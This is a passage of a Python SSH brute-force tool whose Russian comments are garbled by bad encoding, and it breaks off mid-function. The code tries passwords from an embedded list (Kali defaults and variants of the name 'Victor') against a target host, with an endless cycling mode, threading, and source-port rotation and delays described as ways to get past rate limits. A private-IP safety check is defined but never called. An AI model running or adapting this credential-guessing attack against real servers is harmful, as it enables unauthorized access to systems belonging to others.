#!/usr/bin/env python3
"""
–ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π SSH –∞—Ç–∞–∫—É—é—â–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç
–í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Å—Ä–µ–¥–µ!

–ê–≤—Ç–æ—Ä: –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –º–∞—Ç–µ—Ä–∏–∞–ª –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
–õ–∏—Ü–µ–Ω–∑–∏—è: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedSSHAttack:
    """
    –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ SSH –∞—Ç–∞–∫
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.max_attempts = 10000
        self.timeout = 10
        self.delay_between_attempts = 0.5  # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
        self.source_ports = []  # –°–ø–∏—Å–æ–∫ –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        self.current_source_port_index = 0
        self.unlimited_attempts = False  # –†–µ–∂–∏–º –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
        self.port_rotation_enabled = True  # –í—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤
        
        
    
    def _is_safe_target(self, ip):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è (–æ–±—Ö–æ–¥ –ª–∏–º–∏—Ç–æ–≤)
        """
        # –î–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –∫–ª–∏–µ–Ω—Ç—Å–∫–∏—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π
        min_port = 1024
        max_port = 65535
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Ä—Ç—ã
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"‚úÖ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(ports)} –ø–æ—Ä—Ç–æ–≤ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")
        return ports
    
    def get_next_source_port(self):
        """
        –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ª–µ–¥—É—é—â–µ–≥–æ –ø–æ—Ä—Ç–∞ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_source_port_index % len(self.source_ports)]
        self.current_source_port_index += 1
        
        # –ï—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ –≤—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤, –≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–µ –ø–æ—Ä—Ç—ã
        if self.port_rotation_enabled and self.current_source_port_index >= len(self.source_ports):
            print("üîÑ –í—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤: –≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–µ –ø–æ—Ä—Ç—ã...")
            self.generate_source_ports()
            self.current_source_port_index = 0
        
        return port
    
    def generate_unlimited_ports(self):
        """
        –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–æ—Ä—Ç–æ–≤
        """
        print("‚ôæÔ∏è  –í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤")
        self.port_rotation_enabled = True
        self.unlimited_attempts = True
        self.max_attempts = float('inf')  # –ù–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
        self.generate_source_ports(1000)  # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –±–æ–ª—å—à–µ –ø–æ—Ä—Ç–æ–≤
    
    def brute_force_unlimited(self, username, password_list):
        """
        –ù–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–∞—è brute force –∞—Ç–∞–∫–∞ —Å —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏–º –ø–µ—Ä–µ–±–æ—Ä–æ–º –ø–∞—Ä–æ–ª–µ–π
        """
        print(f"‚ôæÔ∏è  –ù–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–∞—è SSH Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –°–ª–æ–≤–∞—Ä—å –ø–∞—Ä–æ–ª–µ–π: {len(password_list)} –ø–∞—Ä–æ–ª–µ–π")
        print(f"üîÑ –†–µ–∂–∏–º: –¶–∏–∫–ª–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π")
        print(f"üîÄ –í—Ä–∞—â–µ–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤: {'–í–∫–ª—é—á–µ–Ω–æ' if self.port_rotation_enabled else '–í—ã–∫–ª—é—á–µ–Ω–æ'}")
        print(f"‚è±Ô∏è  Timeout: {self.timeout} —Å–µ–∫—É–Ω–¥")
        print(f"‚è≥ –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏: {self.delay_between_attempts} —Å–µ–∫")
        
        start_time = time.time()
        cycle_count = 0
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH
        print("\nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("‚ùå SSH –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 22")
                return False
            else:
                print("‚úÖ SSH –¥–æ—Å—Ç—É–ø–µ–Ω")
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSH: {e}")
        
        print(f"\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—É—é brute force –∞—Ç–∞–∫—É...")
        print("üí° –ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏")
        
        try:
            while True:
                cycle_count += 1
                print(f"\nüîÑ –¶–∏–∫–ª {cycle_count}: –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º {len(password_list)} –ø–∞—Ä–æ–ª–µ–π...")
                
                for i, password in enumerate(password_list):
                    self.attempts += 1
                    
                    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∫–∞–∂–¥—ã–µ 10 –ø–æ–ø—ã—Ç–æ–∫
                    if self.attempts % 10 == 0:
                        elapsed_time = time.time() - start_time
                        speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                        print(f"üìä –ü–æ–ø—ã—Ç–∫–∞ {self.attempts}: {username}:{password} | –°–∫–æ—Ä–æ—Å—Ç—å: {speed:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
                    
                    if self.test_ssh_connection(username, password):
                        print(f"üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {username}:{password}")
                        self.found_credentials.append((username, password))
                        return True
                    
                    # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
                    time.sleep(self.delay_between_attempts)
                
                print(f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω —Ü–∏–∫–ª {cycle_count}. –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω, –Ω–∞—á–∏–Ω–∞–µ–º –Ω–æ–≤—ã–π —Ü–∏–∫–ª...")
                
                # –ù–µ–±–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É —Ü–∏–∫–ª–∞–º–∏
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\nüõë –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            return False
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\nüìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã brute force:")
        print(f"  ‚Ä¢ –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"  ‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: {self.attempts}")
        print(f"  ‚Ä¢ –ó–∞–≤–µ—Ä—à–µ–Ω–æ —Ü–∏–∫–ª–æ–≤: {cycle_count}")
        print(f"  ‚Ä¢ –°–∫–æ—Ä–æ—Å—Ç—å: {self.attempts/duration:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
        
        if self.found_credentials:
            print(f"  ‚Ä¢ –ù–∞–π–¥–µ–Ω–æ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    üéâ {username}:{password}")
            return True
        else:
            print(f"  ‚Ä¢ –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return False
    
    def load_github_passwords(self):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π –∏–∑ GitHub (—Ç–æ–ø-1000)
        """
        passwords = [
            # –¢–æ–ø-50 —Å–∞–º—ã—Ö –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', '111111',
            '123123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234', 'dragon', 'password123', 'master', 'hello',
            'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
            'jordan23', 'harley', 'password1', '123qwe', 'robert',
            'matthew', 'jordan', 'asshole', 'daniel', 'andrew',
            'joshua', 'michael', 'charlie', 'michelle', 'jessica',
            'amanda', 'samantha', 'ashley', 'jennifer', 'joshua',
            'robert', 'daniel', 'matthew', 'jordan', 'andrew',
            
            # Kali Linux —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'kali', 'toor', 'kali123', 'toor123', 'kali2024',
            'kali2023', 'kali2022', 'kali2021', 'kali2020',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # –ü—Ä–æ—Å—Ç—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏
            '123', '1234', '12345', '123456', '1234567',
            'password', 'Password', 'PASSWORD', 'password1',
            'Password1', 'PASSWORD1', 'password123', 'Password123',
            'PASSWORD123', 'pass', 'Pass', 'PASS', 'pass123',
            'Pass123', 'PASS123', 'test', 'Test', 'TEST',
            'test123', 'Test123', 'TEST123', 'user', 'User',
            'USER', 'user123', 'User123', 'USER123',
            
            # –°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã
            'password!', 'Password!', 'PASSWORD!', 'password@',
            'Password@', 'PASSWORD@', 'password#', 'Password#',
            'PASSWORD#', 'password$', 'Password$', 'PASSWORD$',
            'password%', 'Password%', 'PASSWORD%', 'password^',
            'Password^', 'PASSWORD^', 'password&', 'Password&',
            'PASSWORD&', 'password*', 'Password*', 'PASSWORD*',
            
            # –ü—É—Å—Ç—ã–µ –∏ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz',
            
            # –ì–æ–¥—ã
            '2024', '2023', '2022', '2021', '2020',
            '2019', '2018', '2017', '2016', '2015',
            
            # –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ
            'admin2024', 'root2024', 'kali2024', 'victor2024',
            'admin123', 'root123', 'kali123', 'victor123',
            'admin!', 'root!', 'kali!', 'victor!',
            'admin@', 'root@', 'kali@', 'victor@',
            'admin#', 'root#', 'kali#', 'victor#',
            
            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ
            'welcome', 'Welcome', 'WELCOME', 'welcome123',
            'Welcome123', 'WELCOME123', 'hello', 'Hello',
            'HELLO', 'hello123', 'Hello123', 'HELLO123',
            'world', 'World', 'WORLD', 'world123',
            'World123', 'WORLD123', 'love', 'Love',
            'LOVE', 'love123', 'Love123', 'LOVE123',
            'hacker', 'Hacker', 'HACKER', 'hacker123',
            'Hacker123', 'HACKER123', 'security', 'Security',
            'SECURITY', 'security123', 'Security123', 'SECURITY123',
            
            # –†—É—Å—Å–∫–∏–µ –ø–∞—Ä–æ–ª–∏ (—Ç—Ä–∞–Ω—Å–ª–∏—Ç–µ—Ä–∞—Ü–∏—è)
            '–ø–∞—Ä–æ–ª—å', 'password', 'admin', 'root', 'kali',
            'victor', '–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å', 'user', '—Ç–µ—Å—Ç', 'test',
            '–¥–µ–º–æ', 'demo', '–≥–æ—Å—Ç—å', 'guest', '—Ö–∞–∫–µ—Ä', 'hacker',
            
            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏
            'qwerty', 'QWERTY', 'Qwerty', 'qwerty123',
            'QWERTY123', 'Qwerty123', 'asdfgh', 'ASDFGH',
            'Asdfgh', 'asdfgh123', 'ASDFGH123', 'Asdfgh123',
            'zxcvbn', 'ZXCVBN', 'Zxcvbn', 'zxcvbn123',
            'ZXCVBN123', 'Zxcvbn123', '1qaz2wsx', '1QAZ2WSX',
            '1qaz2wsx123', '1QAZ2WSX123'
        ]
        
        print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π –∏–∑ GitHub")
        return passwords
    
    def test_ssh_connection(self, username, password, use_random_port=True):
        """
        –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SSH —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å –∑–∞–¥–∞–Ω–Ω—ã–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
        """
        try:
            # –°–æ–∑–¥–∞–µ–º SSH –∫–ª–∏–µ–Ω—Ç
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∏—Å—Ç–æ—á–Ω–∏–∫ –ø–æ—Ä—Ç–∞ –¥–ª—è –æ–±—Ö–æ–¥–∞ –ª–∏–º–∏—Ç–æ–≤
            if use_random_port:
                source_port = self.get_next_source_port()
                # –°–æ–∑–¥–∞–µ–º socket —Å –ø—Ä–∏–≤—è–∑–∫–æ–π –∫ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É –ø–æ—Ä—Ç—É
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('', source_port))
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                    sock=sock
                )
                sock.close()
            else:
                # –û–±—ã—á–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–µ–∑ –ø—Ä–∏–≤—è–∑–∫–∏ –∫ –ø–æ—Ä—Ç—É
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # –ï—Å–ª–∏ –¥–æ—à–ª–∏ —Å—é–¥–∞, –∑–Ω–∞—á–∏—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e):
                return False
            else:
                print(f"‚ö†Ô∏è  SSH –æ—à–∏–±–∫–∞: {e}")
                return False
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {e}")
            return False
    
    def brute_force_worker(self, username, password):
        """
        –†–∞–±–æ—á–∏–π –ø–æ—Ç–æ–∫ –¥–ª—è brute force –∞—Ç–∞–∫–∏
        """
        if self.attempts >= self.max_attempts:
            return None
        
        self.attempts += 1
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –¥–ª—è –æ–±—Ö–æ–¥–∞ –∑–∞—â–∏—Ç—ã
        time.sleep(self.delay_between_attempts)
        
        if self.attempts % 5 == 0:
            print(f"üìä –ü–æ–ø—ã—Ç–∫–∞ {self.attempts}: {username}:{password}")
        
        if self.test_ssh_connection(username, password):
            print(f"üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {username}:{password}")
            self.found_credentials.append((username, password))
            return (username, password)
        
        return None
    
    def brute_force_single_thread(self, username, password_list):
        """
        –û–¥–Ω–æ–ø–æ—Ç–æ—á–Ω–∞—è brute force –∞—Ç–∞–∫–∞ (–º–µ–¥–ª–µ–Ω–Ω–µ–µ, –Ω–æ –±–µ–∑–æ–ø–∞—Å–Ω–µ–µ)
        """
        print(f"üîê –û–¥–Ω–æ–ø–æ—Ç–æ—á–Ω–∞—è SSH Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –°–ª–æ–≤–∞—Ä—å –ø–∞—Ä–æ–ª–µ–π: {len(password_list)} –ø–∞—Ä–æ–ª–µ–π")
        print(f"‚è±Ô∏è  Timeout: {self.timeout} —Å–µ–∫—É–Ω–¥")
        print(f"üî¢ –ú–∞–∫—Å–∏–º—É–º –ø–æ–ø—ã—Ç–æ–∫: {self.max_attempts}")
        print(f"‚è≥ –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏: {self.delay_between_attempts} —Å–µ–∫")
        
        start_time = time.time()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH
        print("\nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("‚ùå SSH –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 22")
                return False
            else:
                print("‚úÖ SSH –¥–æ—Å—Ç—É–ø–µ–Ω")
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSH: {e}")
        
        print(f"\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º brute force –∞—Ç–∞–∫—É...")
        
        # –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –ø–∞—Ä–æ–ª–∏ –ø–æ –æ–¥–Ω–æ–º—É
        for i, password in enumerate(password_list):
            if self.attempts >= self.max_attempts:
                break
            
            print(f"üìä –ü–æ–ø—ã—Ç–∫–∞ {i+1}/{len(password_list)}: {username}:{password}")
            
            if self.test_ssh_connection(username, password):
                print(f"üéâ –£–°–ü–ï–•! –ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {username}:{password}")
                self.found_credentials.append((username, password))
                break
            
            # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
            time.sleep(self.delay_between_attempts)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\nüìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã brute force:")
        print(f"  ‚Ä¢ –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"  ‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: {self.attempts}")
        print(f"  ‚Ä¢ –°–∫–æ—Ä–æ—Å—Ç—å: {self.attempts/duration:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
        
        if self.found_credentials:
            print(f"  ‚Ä¢ –ù–∞–π–¥–µ–Ω–æ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    üéâ {username}:{password}")
            return True
        else:
            print(f"  ‚Ä¢ –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return False
    
    def brute_force_multi_thread(self, username, password_list, max_threads=3):
        """
        –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–∞—è brute force –∞—Ç–∞–∫–∞
        """
        print(f"üîê –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–∞—è SSH Brute Force –∞—Ç–∞–∫–∞ –Ω–∞ {self.target_ip}:{self.target_port}")
        print(f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}")
        print(f"üìÅ –°–ª–æ–≤–∞—Ä—å –ø–∞—Ä–æ–ª–µ–π: {len(password_list)} –ø–∞—Ä–æ–ª–µ–π")
        print(f"üßµ –ü–æ—Ç–æ–∫–æ–≤: {max_threads}")
        print(f"‚è±Ô∏è  Timeout: {self.timeout} —Å–µ–∫—É–Ω–¥")
        print(f"üî¢ –ú–∞–∫—Å–∏–º—É–º –ø–æ–ø—ã—Ç–æ–∫: {self.max_attempts}")
        
        start_time = time.time()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH
        print("\nüîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("‚ùå SSH –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 22")
                return False
            else:
                print("‚úÖ SSH –¥–æ—Å—Ç—É–ø–µ–Ω")
        except Exception as e:
            print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSH: {e}")
        
        print(f"\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º brute force –∞—Ç–∞–∫—É...")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º brute force —Å –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å—é
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–∞—Ä–æ–ª—è
            futures = []
            for password in password_list:
                if self.attempts >= self.max_attempts:
                    break
                future = executor.submit(self.brute_force_worker, username, password)
                futures.append(future)
            
            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
            for future in as_completed(futures):
                if self.found_credentials:
                    # –ï—Å–ª–∏ –Ω–∞—à–ª–∏ –ø–∞—Ä–æ–ª—å, –ø—Ä–µ—Ä—ã–≤–∞–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏
                    executor.shutdown(wait=False)
                    break
                
                try:
                    result = future.result()
                    if result:
                        break
                except Exception as e:
                    print(f"‚ùå –û—à–∏–±–∫–∞ –≤ –ø–æ—Ç–æ–∫–µ: {e}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\nüìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã brute force:")
        print(f"  ‚Ä¢ –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"  ‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: {self.attempts}")
        print(f"  ‚Ä¢ –°–∫–æ—Ä–æ—Å—Ç—å: {self.attempts/duration:.2f} –ø–æ–ø—ã—Ç–æ–∫/—Å–µ–∫")
        
        if self.found_credentials:
            print(f"  ‚Ä¢ –ù–∞–π–¥–µ–Ω–æ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    üéâ {username}:{password}")
            return True
        else:
            print(f"  ‚Ä¢ –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–∞—Ä–æ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            return False
    
    def load_password_list(self, filename):
        """
        –ó–∞–≥—Ä—É–∑–∫–∞ —Å–ø–∏—Å–∫–∞ –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π –∏–∑ {filename}")
            return passwords
        except Exception as e:
